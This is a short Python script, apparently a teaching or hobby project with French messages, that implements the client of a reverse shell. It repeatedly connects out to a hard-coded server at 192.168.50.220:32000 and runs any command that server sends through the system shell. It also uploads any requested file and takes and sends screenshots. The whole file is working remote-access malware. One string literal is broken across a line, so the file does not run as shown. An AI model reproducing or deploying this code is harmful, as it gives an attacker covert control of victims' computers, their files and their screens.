import platform
import socket
import time
import os
import subprocess
from PIL import ImageGrab

HOST_IP = "192.168.50.220
"
HOST_PORT = 32000
MAX_DATA_SIZE = 1024
print(f"Connexion au serveur {HOST_IP}, port {HOST_PORT}")

while True:
    try:
        s = socket.socket()
        s.connect((HOST_IP, HOST_PORT))
    except ConnectionRefusedError:
        print("Erreur: impossible de se connecter au serveur. Reconnexion...")
        time.sleep(4)
    else:
        print("Connecté au serveur")
        break
while True:
    commande_data = s.recv(MAX_DATA_SIZE)
    if not commande_data:
        break
    commande = commande_data.decode()
    print("Commande: ", commande)

    reponse = " "
    commande_split = commande.split()
    if commande == "infos":
        reponse = (platform.platform() + " " + os.getcwd()).encode()
    elif commande == "exit":
        break
    elif len(commande_split) == 2 and commande_split[0] == "cd":
        try:
            os.chdir(commande_split[1].strip("'"))
            reponse = " ".encode()
        except FileNotFoundError:
            reponse = "ERREUR: ce repertoire est invalide".encode()
    elif len(commande_split) == 2 and commande_split[0] == "dl":
        try:
            with open(commande_split[1], "rb") as f:
                reponse = f.read()
        except FileNotFoundError:
            reponse = " ".encode()
    elif len(commande_split) == 2 and commande_split[0] == "capture":
        capture_ecran = ImageGrab.grab()
        capture_filename = commande_split[1] + ".png"
        capture_ecran.save(capture_filename, "PNG")
        try:
            with open(capture_filename, "rb") as f:
                reponse = f.read()
        except FileNotFoundError:
            reponse = " ".encode()
    else:
        resultat = subprocess.run(commande, shell=True, capture_output=True, universal_newlines=True)
        reponse = (resultat.stdout + resultat.stderr).encode()
        if not reponse or len(reponse) == 0:
            reponse = " ".encode()
    header = str(len(reponse)).zfill(13)
    print("header: ", header)
    s.sendall(header.encode())
    if len(reponse) > 0:
        s.sendall(reponse)

s.close()
